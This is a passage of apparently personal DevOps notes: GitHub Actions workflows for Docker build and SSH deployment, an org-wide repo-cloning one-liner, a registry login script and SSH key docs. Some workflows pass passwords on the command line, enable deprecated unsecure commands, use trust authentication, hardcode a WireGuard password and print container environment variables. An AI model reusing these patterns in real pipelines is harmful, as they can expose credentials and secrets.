info\n\n      - name: Docker Login\n        run: docker login registry.gitlab.com -u ${{ secrets.GITLAB_USER_REGISTRY }} -p ${{ secrets.GITLAB_USER_PWD }}\n\n      - name: Check Docker and Docker Compose Versions\n        run: |\n          docker --version\n          docker-compose version\n\n      - name: Checkout repository\n        uses: actions/checkout@v3\n\n      - name: Read alg version\n        id: read-image-version\n        run: echo \"image_version=$(cat changelog/version.md)_main\" &gt;&gt; $GITHUB_OUTPUT\n\n      - name: Check version\n        run: |\n          echo ${{ steps.read-image-version.outputs.image_version }}\n\n      - name: 'base64'\n        run: |\n          echo -n \"${{ secrets.GCP_PRIVATE_KEY_RW  }}\" | base64 -d &gt; gcp_credentials-rw.json\n          echo -n \"${{ secrets.GCP_PRIVATE_KEY_R  }}\" | base64 -d &gt; gcp_credentials-r.json\n          echo -n \"${{ secrets.BUILD_ARGS  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_POSTGRES  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_ELASTIC  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_API  }}\" | base64 -d &gt;&gt; build.args\n\n      - name: Build and Push Docker Image\n        run: |\n          export VERSION=${{ steps.read-image-version.outputs.image_version }}\n          docker build . --tag $CI_REGISTRY_IMAGE:latest --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA \\\n            $(out=\"\"; for i in $(cat build.args); do out=\"$out--build-arg $i \"; done; echo \"$out\"; out=\"\")\n          docker push $CI_REGISTRY_IMAGE:$VERSION\n          docker push $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA\n          docker push $CI_REGISTRY_IMAGE:latest\n\n      - name: Check Vars\n        run: |\n          export VERSION=${{ steps.read-image-version.outputs.image_version }}\n          docker run $CI_REGISTRY_IMAGE:$VERSION env\n</code></pre> <pre><code>name: Full_stage\n\non:\n  push:\n    branches:\n      - 'release*'\n  pull_request:\n    branches:\n      - 'release*'\n\njobs:\n  build_and_test:\n    runs-on: ubuntu-latest\n\n    services:\n      postgres:\n        image: postgres:13\n        env:\n          PG_HOST: postgres\n          POSTGRES_DB: alg_database_test\n          POSTGRES_USER: ${{ secrets.POSTGRES_USER }}\n          POSTGRES_PASSWORD: ${{ secrets.POSTGRES_PASSWORD }}\n          POSTGRES_HOST_AUTH_METHOD: trust\n        ports:\n          - 5432:5432\n        options: --name=postgres --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n      wg-easy:\n        image: weejewel/wg-easy:7\n        env:\n          WG_HOST: 0.0.0.0\n          PASSWORD: wireguard-test-network\n        ports:\n          - '51820:51820/udp'\n          - '51821:51821/tcp'\n        options: '--privileged'\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v3.5.3\n      - name: Test user\n        run: |\n          sudo su - postgres\n          PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE runner WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n          PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE root WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n      - name: Wait for PostgreSQL to be ready\n        run: |\n          until nc -zv localhost 5432; do\n            echo \"Waiting for PostgreSQL to be ready...\"\n            sleep 2\n          done\n\n      - name: Set up Node.js\n        uses: actions/setup-node@v3.8.1\n        with:\n          node-version: '18.16.0'\n\n      - name: Install dependencies and build\n        run: |\n          npm install --omit-dev\n          npm run build\n          cd public\n          npm install --omit-dev\n          npm run build\n        working-directory: ${{ github.workspace }}\n        # continue-on-error: true\n\n      - name: Test application\n        run: npm run autotest\n\n      - name: Upload test results\n        uses: actions/upload-artifact@v3.1.2\n        with:\n          name: test-results\n          path: ${{ github.workspace }}/junit.xml\n\n  build-image:\n    runs-on: ubuntu-latest\n    needs: build_and_test\n    env:\n      CI_REGISTRY_IMAGE: registry.gitlab.com/cartier-lab/alg-backend\n    steps:\n      - name: Check Docker Info\n        run: docker info\n\n      - name: Docker Login\n        run: docker login registry.gitlab.com -u ${{ secrets.GITLAB_USER_REGISTRY }} -p ${{ secrets.GITLAB_USER_PWD }}\n\n      - name: Check Docker and Docker Compose Versions\n        run: |\n          docker --version\n          docker-compose version\n\n      - name: Checkout repository\n        uses: actions/checkout@v3\n\n      - name: Read alg version\n        id: read-image-version\n        run: echo \"image_version=release_$(cat changelog/version.md)\" &gt;&gt; $GITHUB_OUTPUT\n\n      - name: Check version\n        run: |\n          echo ${{ steps.read-image-version.outputs.image_version }}\n\n      - name: 'base64'\n        run: |\n          echo -n \"${{ secrets.GCP_PRIVATE_KEY_RW  }}\" | base64 -d &gt; gcp_credentials-rw.json\n          echo -n \"${{ secrets.GCP_PRIVATE_KEY_R  }}\" | base64 -d &gt; gcp_credentials-r.json\n          echo -n \"${{ secrets.BUILD_ARGS  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_POSTGRES  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_ELASTIC  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_API  }}\" | base64 -d &gt;&gt; build.args\n\n      - name: Build and Push Docker Image\n        run: |\n          export VERSION=${{ steps.read-image-version.outputs.image_version }}\n          docker build . --tag $CI_REGISTRY_IMAGE:latest --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA \\\n            $(out=\"\"; for i in $(cat build.args); do out=\"$out--build-arg $i \"; done; echo \"$out\"; out=\"\")\n          docker push $CI_REGISTRY_IMAGE:$VERSION\n          docker push $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA\n          docker push $CI_REGISTRY_IMAGE:latest\n\n      - name: Check Vars\n        run: |\n          export VERSION=${{ steps.read-image-version.outputs.image_version }}\n          docker run $CI_REGISTRY_IMAGE:$VERSION env\n</code></pre> <pre><code>name: Full_stage\n\non:\n  push:\n    branches:\n      - test\n      # - LG-1523-v2\n  #     - develop\n  #     - 'release/*'\n  # pull_request:\n  #   branches:\n  #     - main\n  #     - develop\n  #     - 'release/*'\n\njobs:\n  # build_and_test:\n  #   runs-on: ubuntu-latest\n\n  #   services:\n  #     postgres:\n  #       image: postgres:13\n  #       env:\n  #         PG_HOST: postgres\n  #         POSTGRES_DB: alg_database_test\n  #         POSTGRES_USER: ${{ secrets.POSTGRES_USER }}\n  #         POSTGRES_PASSWORD: ${{ secrets.POSTGRES_PASSWORD }}\n  #         POSTGRES_HOST_AUTH_METHOD: trust\n  #       ports:\n  #         - 5432:5432\n  #       options: --name=postgres --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n  #   steps:\n  #   - name: Checkout code\n  #     uses: actions/checkout@v3.5.3\n  #   - name: Test user\n  #     run: |\n  #       sudo su - postgres\n  #       PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE runner WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n  #       PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE root WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n  #   - name: Wait for PostgreSQL to be ready\n  #     run: |\n  #       until nc -zv localhost 5432; do\n  #         echo \"Waiting for PostgreSQL to be ready...\"\n  #         sleep 2\n  #       done\n\n  #   - name: Set up Node.js\n  #     uses: actions/setup-node@v3.8.1\n  #     with:\n  #       node-version: '16'\n\n  #   - name: Install dependencies and build\n  #     run: |\n  #       npm install --omit-dev\n  #       npm run build\n  #       cd public\n  #       npm install --omit-dev\n  #       npm run build\n  #     working-directory: ${{ github.workspace }}\n  #     # continue-on-error: true\n\n  #   - name: Test application\n  #     run: npm run autotest\n\n  #   - name: Upload test results\n  #     uses: actions/upload-artifact@v3.1.2\n  #     with:\n  #       name: test-results\n  #       path: ${{ github.workspace }}/junit.xml\n\n  build-image:\n      runs-on: ubuntu-latest\n      # needs: build_and_test\n      env:\n        CI_REGISTRY_IMAGE: ${{secrets.DOCKER_REPO}}/${{github.repository}}\n      steps:\n        - name: Check Docker Info\n          run: docker info\n\n        - name: Docker Login\n          run: | \n            echo ${{secrets.DOCKER_REPO_PASS}} | docker login -u ${{secrets.DOCKER_REPO_USER}} --password-stdin ${{secrets.DOCKER_REPO}}\n            docker login registry.gitlab.com -u ${{ secrets.GITLAB_USER_REGISTRY }} -p ${{ secrets.GITLAB_USER_PWD }}\n\n        - name: Check Docker and Docker Compose Versions\n          run: |\n            docker --version\n            docker-compose version\n\n        - name: Checkout repository\n          uses: actions/checkout@v3\n\n        - name: Read alg version\n          id: read-image-version\n          run: echo \"image_version=$(cat changelog/version.md)_fuse\" &gt;&gt; $GITHUB_OUTPUT\n\n        - name: Check version\n          run: | \n            echo ${{ steps.read-image-version.outputs.image_version }}\n\n        - name: Build and Push Docker Image\n          run: |\n            export VERSION=${{ steps.read-image-version.outputs.image_version }}\n            docker build . --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA --tag registry.gitlab.com/cartier-lab/alg-backend:$VERSION \\\n              $(out=\"\"; for i in $(cat ./build.args | base64 -d); do out=\"$out--build-arg $i \"; done; echo \"$out\"; out=\"\")\n            docker push $CI_REGISTRY_IMAGE:$VERSION\n            docker push $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA\n            docker push registry.gitlab.com/cartier-lab/alg-backend:$VERSION\n\n        - name: Check Vars\n          run: |\n            export VERSION=${{ steps.read-image-version.outputs.image_version }}\n            docker run $CI_REGISTRY_IMAGE:$VERSION env\n</code></pre>"},{"location":"Github/actionsCentex/","title":"actionsCentex","text":""},{"location":"Github/actionsCentex/#actions-example-centex","title":"Actions Example Centex","text":"<pre><code>name: Docker build and deploy Prod\n\non:\n  push:\n    tags:\n      - '[0-9]+\\.[0-9]+\\.[0-9]'\n      - '[0-9]+\\.[0-9]+\\.[0-9]+'\n      - '[0-9]+\\.[0-9]+\\.[0-9]+\\-prod'\n\n\njobs:\n  build-image:\n      runs-on: ubuntu-latest\n      env:\n        CI_REGISTRY: ghcr.io\n        CI_REGISTRY_IMAGE: ghcr.io/bts-centex/centex-strapi\n        ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n        SHA8: ${GITHUB_SHA::8}\n      steps:\n        - name: Extract branch name on push\n          if: github.event_name != 'pull_request'\n          shell: bash\n          run: echo \"::set-env name=CI_IMAGE_TAG::${{github.ref_name}}\"\n          id: extract_branch\n\n        - name: Login to Github\n          uses: docker/login-action@v3\n          with:\n            registry: ${{ env.CI_REGISTRY }}\n            username: ${{ secrets.GHCR_USER }}\n            password: ${{ secrets.GHCR_TOKEN }}\n\n        - name: Checkout repository\n          uses: actions/checkout@v3\n\n        - name: Build and Push Docker Image\n          run: |\n            docker build . --tag $CI_REGISTRY_IMAGE:$CI_IMAGE_TAG --tag $CI_REGISTRY_IMAGE:latest --build-arg PUBLIC_URL=${{ secrets.PUBLIC_URL_PROD }}\n            docker push $CI_REGISTRY_IMAGE:$CI_IMAGE_TAG\n            docker push $CI_REGISTRY_IMAGE:latest\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build-image\n    env:\n      DOCKER_TAG: ${{github.ref_name}}\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n    steps:\n        - uses: trstringer/manual-approval@v1.9.0\n          timeout-minutes: 5\n          with:\n            secret: ${{ secrets.APROVAL }}\n            approvers: devops\n            minimum-approvals: 1\n            issue-title: \"Deploying ${{github.ref_name}} to prod\"\n            issue-body: \"Please approve or deny the deployment of version ${{github.ref_name}}\"\n\n        - name : Set environment variables based on tag \n          run : |\n            if [[ \"${{github.ref_name}}\" =~ ^[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then\n              echo \"::set-env name=SERVER::production\"\n              echo \"::set-env name=SSH_USER::${{ secrets.SSH_USER }}\"\n              echo \"::set-env name=SERVER_IP::${{ secrets.SSH_HOST_PROD }}\"\n              echo \"::set-env name=SSH_KEY::${{ secrets.SSH_PRIVATE_KEY_PROD }}\"\n              echo \"::set-env name=WORK_DIR::${{ secrets.WORK_DIR_PROD }}\"\n            else \n              echo \"Invalid tag format specified.\"\n              exit 1;\n            fi\n\n        - name: install ssh keys\n          run: |\n            install -m 600 -D /dev/null ~/.ssh/id_rsa\n            echo \"${{ secrets.SSH_PRIVATE_KEY_PROD }}\" &gt; ~/.ssh/id_rsa\n            ssh-keyscan -H ${{ env.SERVER_IP }} &gt; ~/.ssh/known_hosts\n        - name: connect and pull\n          run: |\n            echo \"Using tag: ${{github.ref_name}}\"\n            echo \"Deploying in ${{ env.SERVER }} server\"\n            ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"docker login ghcr.io -u ${{ secrets.GHCR_USER }} -p ${{ secrets.GHCR_TOKEN_ONLY_READ }} &amp;&amp; exit\"\n            ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; export TAG=\"${{github.ref_name}}\" &amp;&amp; docker compose pull &amp;&amp; docker compose up -d --force-recreate &amp;&amp; exit\"\n            ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; docker system prune -af &amp;&amp; exit\"\n\n        - name: cleanup\n          run: rm -rf ~/.ssh\n</code></pre> <pre><code>name: Docker build and deploy test/staging\n\non:\n  push:\n    tags:\n      - '[0-9]+\\.[0-9]+\\.[0-9]+\\-test'\n      - '[0-9]+\\.[0-9]+\\.[0-9]+\\-rc'\n      - '[0-9]+\\.[0-9]+\\.[0-9]+\\-RC'\n\njobs:\n  build-image:\n      runs-on: ubuntu-latest\n      env:\n        CI_REGISTRY: ghcr.io\n        CI_REGISTRY_IMAGE: ghcr.io/bts-centex/centex-strapi\n        ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n        SHA8: ${GITHUB_SHA::8}\n      steps:\n        - name: Extract branch name on push\n          if: github.event_name != 'pull_request'\n          shell: bash\n          run: echo \"::set-env name=CI_IMAGE_TAG::${{github.ref_name}}\"\n          id: extract_branch\n\n        - name: Login to Github\n          uses: docker/login-action@v3\n          with:\n            registry: ${{ env.CI_REGISTRY }}\n            username: ${{ secrets.GHCR_USER }}\n            password: ${{ secrets.GHCR_TOKEN }}\n\n        - name: Checkout repository\n          uses: actions/checkout@v3\n\n        - name : Set environment variables based on tag \n          env:\n            DOCKER_TAG: ${{github.ref_name}}\n            ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n          run : |\n            if [[ \"${{github.ref_name}}\" =~ ^[0-9]+\\.[0-9]+\\.[0-9]+-(rc|RC)$ ]]; then\n              echo \"::set-env name=SERVER::staging\"\n              echo \"::set-env name=SSH_USER::${{ secrets.SSH_USER }}\"\n              echo \"::set-env name=SERVER_IP::${{ secrets.SSH_HOST }}\"\n              echo \"::set-env name=SSH_KEY::${{ secrets.SSH_PRIVATE_KEY }}\"\n              echo \"::set-env name=WORK_DIR::${{ secrets.WORK_DIR_STAGING }}\"\n              echo \"::set-env name=PUBLIC_URL::${{ secrets.PUBLIC_URL_STG }}\"\n            elif [[ \"${{github.ref_name}}\" =~ ^[0-9]+\\.[0-9]+\\.[0-9]+(-test)$ ]]; then\n              echo \"::set-env name=SERVER::test\"\n              echo \"::set-env name=SSH_USER::${{ secrets.SSH_USER }}\"\n              echo \"::set-env name=SERVER_IP::${{ secrets.SSH_HOST }}\"\n              echo \"::set-env name=SSH_KEY::${{ secrets.SSH_PRIVATE_KEY }}\"\n              echo \"::set-env name=WORK_DIR::${{ secrets.WORK_DIR_TEST }}\"\n              echo \"::set-env name=PUBLIC_URL::${{ secrets.PUBLIC_URL_TEST }}\"\n            else \n              echo \"Invalid tag format specified.\"\n              exit 1;\n            fi\n\n        - name: Build and Push Docker Image\n          run: |\n            docker build . --tag $CI_REGISTRY_IMAGE:$CI_IMAGE_TAG --tag $CI_REGISTRY_IMAGE:latest --build-arg PUBLIC_URL=${{ env.PUBLIC_URL }}\n            docker push $CI_REGISTRY_IMAGE:$CI_IMAGE_TAG\n            docker push $CI_REGISTRY_IMAGE:latest\n\n        - name: install ssh keys\n          run: |\n            install -m 600 -D /dev/null ~/.ssh/id_rsa\n            echo \"${{ secrets.SSH_PRIVATE_KEY }}\" &gt; ~/.ssh/id_rsa\n            ssh-keyscan -H ${{ env.SERVER_IP }} &gt; ~/.ssh/known_hosts\n        - name: connect and pull\n          run: |\n            echo \"Using tag: ${{github.ref_name}}\"\n            echo \"Deploying in ${{ env.SERVER }} server\"\n            ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"docker login ghcr.io -u ${{ secrets.GHCR_USER }} -p ${{ secrets.GHCR_TOKEN_ONLY_READ }} &amp;&amp; exit\"\n            ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; export TAG=\"${{github.ref_name}}\" &amp;&amp; docker compose pull &amp;&amp; docker compose up -d --force-recreate &amp;&amp; exit\"\n            ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; docker system prune -af &amp;&amp; exit\"\n\n        - name: cleanup\n          run: rm -rf ~/.ssh\n</code></pre> <pre><code>name: Manual Deploy Strapi\n\non:\n    workflow_dispatch:\n      inputs:\n        docker-image-tag:\n          description: 'Docker Image Tag'\n          required: true\n          default: 'latest'\n        env-name:\n          description: 'Select the environment in which you want to deploy'\n          type: choice\n          options:\n            - test\n            - staging\n          required: true\n\njobs:\n  manual-deploy:\n    name: Deploying Strapi Manually\n    runs-on: ubuntu-latest\n    steps:\n    - name: Code Checkout\n      uses: actions/checkout@v3\n\n    - name : Set environment variables based on tag \n      env:\n        DOCKER_TAG: ${{ github.event.inputs.docker-image-tag }}\n        ENV_NAME: ${{ github.event.inputs.env-name }}\n        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n      run : |\n        if [[ \"${{ env.ENV_NAME }}\" == \"staging\" ]]; then\n          echo \"::set-env name=SERVER::staging\"\n          echo \"::set-env name=SSH_USER::${{ secrets.SSH_USER }}\"\n          echo \"::set-env name=SERVER_IP::${{ secrets.SSH_HOST }}\"\n          echo \"::set-env name=SSH_KEY::${{ secrets.SSH_PRIVATE_KEY }}\"\n          echo \"::set-env name=WORK_DIR::${{ secrets.WORK_DIR_STAGING }}\"\n          echo \"::set-env name=DOCKER_TAG::${{ env.DOCKER_TAG }}\"\n        elif [[ \"${{ env.ENV_NAME }}\" == \"test\" ]]; then\n          echo \"::set-env name=SERVER::test\"\n          echo \"::set-env name=SSH_USER::${{ secrets.SSH_USER }}\"\n          echo \"::set-env name=SERVER_IP::${{ secrets.SSH_HOST }}\"\n          echo \"::set-env name=SSH_KEY::${{ secrets.SSH_PRIVATE_KEY }}\"\n          echo \"::set-env name=WORK_DIR::${{ secrets.WORK_DIR_TEST }}\" \n          echo \"::set-env name=DOCKER_TAG::${{ env.DOCKER_TAG }}\"\n        else \n          echo \"Invalid environment format specified.\"\n          exit 1;\n        fi\n\n    - name: install ssh keys\n      run: |\n        install -m 600 -D /dev/null ~/.ssh/id_rsa\n        echo \"${{ secrets.SSH_PRIVATE_KEY }}\" &gt; ~/.ssh/id_rsa\n        ssh-keyscan -H ${{ env.SERVER_IP }} &gt; ~/.ssh/known_hosts\n    - name: connect and pull\n      run: |\n        echo \"Using tag: ${{ env.DOCKER_TAG }}\"\n        echo \"Deploying in ${{ env.SERVER }} server\"\n        ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"docker login ghcr.io -u ${{ secrets.GHCR_USER }} -p ${{ secrets.GHCR_TOKEN_ONLY_READ }} &amp;&amp; exit\"\n        ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; export TAG=\"${{ env.DOCKER_TAG }}\" &amp;&amp; docker compose pull &amp;&amp; docker compose up -d --force-recreate &amp;&amp; exit\"\n        ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; docker system prune -af &amp;&amp; exit\"\n\n    - name: cleanup\n      run: rm -rf ~/.ssh\n</code></pre> <pre><code>name: Manual Build &amp; Deploy Strapi \n\non:\n    workflow_dispatch:\n      inputs:\n        docker-image-tag:\n          description: 'Docker Image Tag'\n          required: true\n          default: 'latest'\n        env-name:\n          description: 'Select the environment in which you want to deploy'\n          type: choice\n          options:\n            - test\n            - staging\n          required: true\n\njobs:\n  build-image:\n      name: Building APP\n      runs-on: ubuntu-latest\n      env:\n        CI_REGISTRY: ghcr.io\n        CI_REGISTRY_IMAGE: ghcr.io/bts-centex/centex-strapi\n        DOCKER_TAG: ${{ github.event.inputs.docker-image-tag }}\n        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n      steps:    \n      - name: Login to Github\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.CI_REGISTRY }}\n          username: ${{ secrets.GHCR_USER }}\n          password: ${{ secrets.GHCR_TOKEN }}\n\n      - name: Checkout repository\n        uses: actions/checkout@v3\n\n      - name: Build and Push Docker Image\n        run: |\n          docker build . --tag $CI_REGISTRY_IMAGE:$DOCKER_TAG --tag $CI_REGISTRY_IMAGE:latest-test\n          docker push $CI_REGISTRY_IMAGE:$DOCKER_TAG\n          docker push $CI_REGISTRY_IMAGE:latest-test\n  manual-deploy:\n    name: Deploying Strapi Manually\n    needs: build-image\n    runs-on: ubuntu-latest\n    steps:\n    - name: Code Checkout\n      uses: actions/checkout@v3\n\n    - name : Set environment variables based on tag \n      env:\n        DOCKER_TAG: ${{ github.event.inputs.docker-image-tag }}\n        ENV_NAME: ${{ github.event.inputs.env-name }}\n        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n      run : |\n        if [[ \"${{ env.ENV_NAME }}\" == \"staging\" ]]; then\n          echo \"::set-env name=SERVER::staging\"\n          echo \"::set-env name=SSH_USER::${{ secrets.SSH_USER }}\"\n          echo \"::set-env name=SERVER_IP::${{ secrets.SSH_HOST }}\"\n          echo \"::set-env name=SSH_KEY::${{ secrets.SSH_PRIVATE_KEY }}\"\n          echo \"::set-env name=WORK_DIR::${{ secrets.WORK_DIR_STAGING }}\"\n          echo \"::set-env name=DOCKER_TAG::${{ env.DOCKER_TAG }}\"\n        elif [[ \"${{ env.ENV_NAME }}\" == \"test\" ]]; then\n          echo \"::set-env name=SERVER::test\"\n          echo \"::set-env name=SSH_USER::${{ secrets.SSH_USER }}\"\n          echo \"::set-env name=SERVER_IP::${{ secrets.SSH_HOST }}\"\n          echo \"::set-env name=SSH_KEY::${{ secrets.SSH_PRIVATE_KEY }}\"\n          echo \"::set-env name=WORK_DIR::${{ secrets.WORK_DIR_TEST }}\" \n          echo \"::set-env name=DOCKER_TAG::${{ env.DOCKER_TAG }}\"\n        else \n          echo \"Invalid environment format specified.\"\n          exit 1;\n        fi\n\n    - name: install ssh keys\n      run: |\n        install -m 600 -D /dev/null ~/.ssh/id_rsa\n        echo \"${{ secrets.SSH_PRIVATE_KEY }}\" &gt; ~/.ssh/id_rsa\n        ssh-keyscan -H ${{ env.SERVER_IP }} &gt; ~/.ssh/known_hosts\n    - name: connect and pull\n      run: |\n        echo \"Using tag: ${{ env.DOCKER_TAG }}\"\n        echo \"Deploying in ${{ env.SERVER }} server\"\n        ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"docker login ghcr.io -u ${{ secrets.GHCR_USER }} -p ${{ secrets.GHCR_TOKEN_ONLY_READ }} &amp;&amp; exit\"\n        ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; export TAG=\"${{ env.DOCKER_TAG }}\" &amp;&amp; docker compose pull &amp;&amp; docker compose up -d --force-recreate &amp;&amp; exit\"\n        ssh ${{ env.SSH_USER }}@${{ env.SERVER_IP }} \"cd ${{ env.WORK_DIR }} &amp;&amp; docker system prune -af &amp;&amp; exit\"\n\n    - name: cleanup\n      run: rm -rf ~/.ssh\n</code></pre> <pre><code>name: Build main code in PR\n\non:\n  pull_request:\n    branches:\n      - main\n\njobs:\n  build-image:\n      runs-on: ubuntu-latest\n      env:\n        CI_REGISTRY: ghcr.io\n        CI_REGISTRY_IMAGE: ghcr.io/bts-centex/centex-strapi\n        ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n        SHA8: ${GITHUB_SHA::8}\n      steps:\n        - name: Extract branch name on push\n          if: github.event_name != 'pull_request'\n          shell: bash\n          run: echo \"::set-env name=CI_IMAGE_TAG::${{github.ref_name}}\"\n          id: extract_branch\n\n        - name: Extract branch name on pull request\n          if: github.event_name == 'pull_request'\n          run: echo \"::set-env name=CI_IMAGE_TAG::${{ env.SHA8 }}\" \n\n        - name: Login to Github\n          uses: docker/login-action@v3\n          with:\n            registry: ${{ env.CI_REGISTRY }}\n            username: ${{ secrets.GHCR_USER }}\n            password: ${{ secrets.GHCR_TOKEN }}\n\n        - name: Checkout repository\n          uses: actions/checkout@v3\n\n        - name: Build and Push Docker Image\n          run: |\n            docker build . --tag $CI_REGISTRY_IMAGE:$CI_IMAGE_TAG --tag $CI_REGISTRY_IMAGE:latest\n            docker push $CI_REGISTRY_IMAGE:$CI_IMAGE_TAG\n            docker push $CI_REGISTRY_IMAGE:latest\n</code></pre> <pre><code>name: 'Bump Version'\n\non:\n  push:\n    paths-ignore:\n      - '.github'\n    branches:\n      - 'main'\n\njobs:\n  bump-version:\n    name: 'Bump Version on master'\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n\n    steps:\n      - name: 'Checkout source code'\n        uses: 'actions/checkout@v2'\n        with:\n          ref: ${{ github.ref }}\n      - name: 'cat package.json'\n        run: cat ./package.json\n      - name: 'Automated Version Bump'\n        id: version-bump\n        uses: 'phips28/gh-action-bump-version@master'\n        with:\n          version-type: 'patch'\n          tag-suffix: '-beta'\n          commit-message: 'CI: bumps version to {{version}} [skip ci]'\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: 'cat package.json'\n        run: cat ./package.json\n      - name: 'Output Step'\n        env:\n          NEW_TAG: ${{ steps.version-bump.outputs.newTag }}\n        run: echo \"new tag $NEW_TAG\"\n</code></pre>"},{"location":"Github/cloneAllRepos/","title":"cloneAllRepos","text":""},{"location":"Github/cloneAllRepos/#clone-all-repos-in-a-organization","title":"Clone all repos in a organization","text":""},{"location":"Github/cloneAllRepos/#http","title":"http","text":"<pre><code>curl -s -H \"Authorization: token $YOUR_TOKEN\" \\\n\"https://api.github.com/orgs/$YOUR_ORG/repos?per_page=100\"\\\n| jq -r \".[].clone_url\" \\\n| xargs -L1 git clone\n</code></pre> <p>ssh</p> <pre><code>curl -s -H \"Authorization: token $YOUR_TOKEN\" \\\n\"https://api.github.com/orgs/$YOUR_ORG/repos?per_page=100\"\\\n| jq -r \".[].ssh_url\" \\\n| xargs -L1 git clone\n</code></pre>"},{"location":"Github/loginGhcr/","title":"Login Docker registry","text":"<pre><code>#!/bin/bash\n# docker login ghcr.io -p &lt;token&gt;\n\necho \"Define your PUBLIC_URL to build it. e.g https://centex.centexteam.com\"\nread PUBLIC_URL\n# Vars\n# docker pull ghcr.io/bts-centex/centex-strapi:875cb539\n# docker login ghcr.io -u developer -p &lt;TOKEN&gt;\nREGISTRY=ghcr.io\nORG=bts-centex\nUSER=developer\nIMAGE_NAME=centex-strapi\nIMAGE_TAG=localbuild_$(hostname)\n\n\ncheck_login() {\n    docker login $REGISTRY\n}\nbuild_image() {\n    docker build -t $REGISTRY/$ORG/$IMAGE_NAME:$IMAGE_TAG --build-arg PUBLIC_URL=$PUBLIC_URL .\n}\npush_image() {\n    docker push $REGISTRY/$ORG/$IMAGE_NAME:$IMAGE_TAG\n}\n\ncheck_login\nbuild_image\npush_image\n</code></pre>"},{"location":"Gitlab/GitHubKeyssh/","title":"GitHubKeyssh","text":""},{"location":"Gitlab/GitHubKeyssh/#about-ssh-key-passphrases","title":"About SSH key passphrases","text":"<p>You can access and write data in repositories on GitHub.com using SSH (Secure Shell Protocol). When you connect via SSH, you authenticate using a private key file on your local machine. For more information, see \"About SSH.\"</p> <p>When you generate an SSH key, you can add a passphrase to further secure the key. Whenever you use the key, you must enter the passphrase. If your key has a passphrase and you don't want to enter the passphrase every time you use the key, you can add your key to the SSH agent. The SSH agent manages your SSH keys and remembers your passphrase.</p> <p>If you don't already have an SSH key, you must generate a new SSH key to use for authentication. If you're unsure whether you already have an SSH key, you can check for existing keys. For more information, see \"Checking for existing SSH keys.\"</p> <p>If you want to use a hardware security key to authenticate to GitHub, you must generate a new SSH key for your hardware security key. You must connect your hardware security key to your computer when you authenticate with the key pair. For more information, see the OpenSSH 8.2 release notes.</p>"},{"location":"Gitlab/GitHubKeyssh/#generating-a-new-ssh-key","title":"Generating a new SSH key","text":"<p>You can generate a new SSH key on your local machine. After you generate the key, you can add 